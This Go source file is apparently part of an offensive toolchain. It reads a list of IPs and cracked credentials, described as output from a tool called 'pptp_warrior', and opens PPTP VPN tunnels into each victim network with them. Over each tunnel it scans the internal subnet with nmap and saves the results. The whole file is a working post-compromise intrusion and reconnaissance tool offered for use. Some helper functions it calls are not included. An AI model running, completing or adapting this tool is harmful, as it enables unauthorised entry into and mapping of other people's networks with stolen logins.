package main

import (
	"bufio"
	"context"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"time"
)

func main() {
	inputFile := "results/success.txt"
	file, err := os.Open(inputFile)
	if err != nil {
		fmt.Printf("[-] Could not open %s. Make sure pptp_warrior found success targets first.\n", inputFile)
		return
	}
	defer file.Close()

	fmt.Println("[*] Starting Orchestrated Network Harvester (Go + Nmap Table Layout)...")
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		ip := parseValue(line, "IP:")
		user := parseValue(line, "User:")
		pass := parseValue(line, "Pass:")

		if ip == "" || user == "" || pass == "" {
			continue
		}

		fmt.Printf("\n[*] ------------------------------------------------------------\n")
		fmt.Printf("[*] Connecting & Requesting Tunnel for: %s\n", ip)
		harvestAndOrchestrate(ip, user, pass, 45*time.Second)
	}

	exec.Command("sudo", "killall", "-9", "pppd").Run()
	fmt.Println("\n[+] Harvester session completed.")
}

func harvestAndOrchestrate(ip, username, password string, timeout time.Duration) {
	uniqueID := fmt.Sprintf("%d_%d", time.Now().UnixNano(), rand.Intn(100000))
	fileName := fmt.Sprintf("harvester_%s_%s", strings.ReplaceAll(ip, ".", "_"), uniqueID)
	filePath := fmt.Sprintf("/etc/ppp/peers/%s", fileName)

	configContent := fmt.Sprintf(`pty "pptp %s --nolaunchpppd"
lock
noauth
nobsdcomp
nodeflate
nodetach
maxfail 1
name "%s"
password "%s"
`, ip, username, password)

	if err := os.WriteFile(filePath, []byte(configContent), 0600); err != nil {
		return
	}
	defer os.Remove(filePath)

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "pppd", "call", fileName)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return
	}
	cmd.Stderr = cmd.Stdout

	if err := cmd.Start(); err != nil {
		return
	}

	var localIP, remoteIP, ifaceName string
	outputScanner := bufio.NewScanner(stdout)

	for outputScanner.Scan() {
		line := outputScanner.Text()

		if strings.Contains(line, "Using interface") {
			fields := strings.Fields(line)
			if len(fields) >= 3 {
				ifaceName = fields[2]
			}
		}
		if strings.Contains(line, "local  IP address") {
			parts := strings.Fields(line)
			if len(parts) >= 4 {
				localIP = parts[3]
			}
		}
		if strings.Contains(line, "remote IP address") {
			parts := strings.Fields(line)
			if len(parts) >= 4 {
				remoteIP = parts[3]
			}
		}

		if localIP != "" && ifaceName != "" {
			break
		}
	}

		var subnets []string
		if localIP != "" && ifaceName != "" {
			fmt.Printf("[SUCCESS] Tunnel Active! Interface: %s | Internal IP: %s\n", ifaceName, localIP)
			subnets = calculateSubnet(localIP)
			
			targetDir := fmt.Sprintf("results/%s", ip)
			_ = os.MkdirAll(targetDir, 0755)
			
			// نقوم بمسح الرينج الأول (الأكثر دقة) افتراضياً
			if len(subnets) > 0 {
				runAdvancedNmapScan(subnets[0], ifaceName, targetDir)
			}
		} else {
			fmt.Printf("[-] Failed to establish tunnel connection for %s\n", ip)
		}

		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		_ = cmd.Wait()

		if localIP != "" {
			saveTargetDetails(ip, username, password, localIP, remoteIP, subnets)
		}
}